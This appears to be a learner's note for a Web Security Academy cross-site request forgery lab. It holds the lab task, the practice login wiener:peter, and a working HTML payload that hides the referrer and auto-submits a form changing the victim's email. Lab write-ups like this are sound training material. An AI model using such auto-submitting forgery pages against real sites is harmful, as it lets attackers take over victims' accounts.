This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

---

temp
```html
<html>
    <head>
        <meta name="referrer" content="never"> 
    </head>
    <body>
        <h1>Hello world!</h1>
        <form action="https://0ab5007803da07dc80ad356300f6002f.web-security-academy.net/my-account/change-email" method = "post" id="csrf-form">
            <input type="hidden" name="email" value="test6@test.ca">
        </form>

        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

